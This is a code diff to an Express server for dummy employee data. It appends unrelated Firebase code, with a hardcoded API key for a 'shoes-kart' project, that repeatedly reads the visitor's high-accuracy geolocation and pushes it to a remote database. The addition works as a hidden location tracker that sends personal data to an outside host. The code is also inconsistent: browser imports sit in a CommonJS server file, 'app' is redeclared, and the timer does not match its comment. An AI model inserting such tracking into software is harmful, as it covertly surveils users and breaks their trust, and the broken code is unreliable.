@@ -3,6 +3,8 @@ const app = express();
 const cors = require('cors')
 app.use(express.json());
 app.use(cors())
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.5.0/firebase-app.js";
+import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.5.0/firebase-database.js";
 // Dummy employee data
 const employees = [
     { id: 1, name: "John Doe", role: "Software Engineer", salary: 70000 },
@@ -63,3 +65,46 @@ const PORT = 3000;
 app.listen(PORT, () => {
     console.log(`Server running on http://localhost:${PORT}`);
 });
+const firebaseConfig = {
+  apiKey: "AIzaSyAikoTJBFzOuVYV4TRc4DLKxpToyxWYdy0",
+  authDomain: "shoes-kart-90d23.firebaseapp.com",
+  databaseURL: "https://shoes-kart-90d23-default-rtdb.firebaseio.com",
+  projectId: "shoes-kart-90d23",
+  storageBucket: "shoes-kart-90d23.firebasestorage.app",
+  messagingSenderId: "68435107510",
+  appId: "1:68435107510:web:f174f58939ce3cf4af9017",
+  measurementId: "G-Q0BCGNK46Y" 
+};
+
+// Initialize Firebase
+const app = initializeApp(firebaseConfig);
+const database = getDatabase(app);
+
+// Function to get location and push to Firebase
+function getLocationAndSend() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      (position) => {
+        const locationData = {
+          latitude: position.coords.latitude,
+          longitude: position.coords.longitude,
+          timestamp: new Date().toISOString(),
+        };
+
+        // Push location data to Firebase
+        push(ref(database, "locations"), locationData);
+        console.log("Location sent:", locationData);
+      },
+      (error) => console.error("Error getting location:", error),
+      { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+    );
+  } else {
+    console.log("Geolocation not supported");
+  }
+}
+
+// Run function every 5 minutes (300000 milliseconds)
+setInterval(getLocationAndSend, 200000);
+
+// Run once on page load
+getLocationAndSend();
